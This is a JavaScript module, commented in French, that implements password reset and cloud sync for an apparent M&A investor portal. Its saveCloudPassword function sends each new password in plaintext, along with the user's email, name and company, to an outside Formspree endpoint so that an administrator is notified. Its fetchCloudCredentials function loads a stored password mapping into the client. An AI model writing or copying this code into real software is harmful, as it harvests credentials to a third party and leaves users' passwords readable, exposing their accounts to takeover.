/**
 * Service de Synchronisation Cloud des Mots de Passe & Notifications M&A
 *
 * Permet aux utilisateurs de réinitialiser leur mot de passe depuis n'importe quel support
 * (ordinateur, mobile, local ou extérieur) et garantit la persistance universelle
 * ainsi que la notification immédiate de l'administrateur.
 */

const API_CREDENTIALS_URL = '/api/investisseurs/credentials';
const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mrblwazb';

export async function fetchCloudCredentials() {
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 4000);
    const res = await fetch(API_CREDENTIALS_URL, {
      method: 'GET',
      headers: { 'Accept': 'application/json' },
      signal: controller.signal,
      cache: 'no-store',
    });
    clearTimeout(timeoutId);
    if (!res.ok) return {};
    const data = await res.json();
    return data?.passwords || {};
  } catch (err) {
    // Si hors ligne ou réseau restreint, renvoyer un mapping vide
    return {};
  }
}

export async function saveCloudPassword({ email, newPassword, investorName, companyName, action = 'reset-password' }) {
  const cleanEmail = (email || '').trim().toLowerCase();
  const cleanPass = (newPassword || '').trim();

  // 1. Appel vers l'API Cloud (Vercel Blob + notification serveur)
  let cloudSuccess = false;
  let apiData = null;
  try {
    const res = await fetch(API_CREDENTIALS_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: JSON.stringify({
        action,
        email: cleanEmail,
        newPassword: cleanPass,
        investorName: investorName || '',
        companyName: companyName || '',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
      }),
    });
    if (res.ok) {
      cloudSuccess = true;
      apiData = await res.json().catch(() => ({}));
    }
  } catch (err) {
    console.warn('API cloud non joignable (mode autonome ou local):', err);
  }

  // 2. Notification administrateur directe côté client (Garantie de réception doublée)
  try {
    const isReset = action === 'reset-password';
    await fetch(FORMSPREE_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
      },
      body: JSON.stringify({
        _subject: `[${isReset ? 'RÉINITIALISATION' : 'MODIFICATION'} MOT DE PASSE] ${investorName || cleanEmail} (${companyName || 'Investisseur'})`,
        type: isReset ? 'Réinitialisation autonome par l\'utilisateur' : 'Modification mot de passe',
        investisseur: investorName || 'Investisseur Partenaire',
        societe: companyName || 'Société',
        email: cleanEmail,
        nouveauMotDePasse: cleanPass,
        dateHeure: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
        support: typeof navigator !== 'undefined' ? (navigator.userAgent.includes('Mobile') ? 'Smartphone / Mobile' : 'Ordinateur / Desktop') : 'Inconnu',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
      }),
    });
  } catch (err) {
    console.warn('Notification Formspree directe client échouée:', err);
  }

  return {
    success: true,
    cloudPersisted: cloudSuccess,
    passwords: apiData?.passwords || {},
  };
}
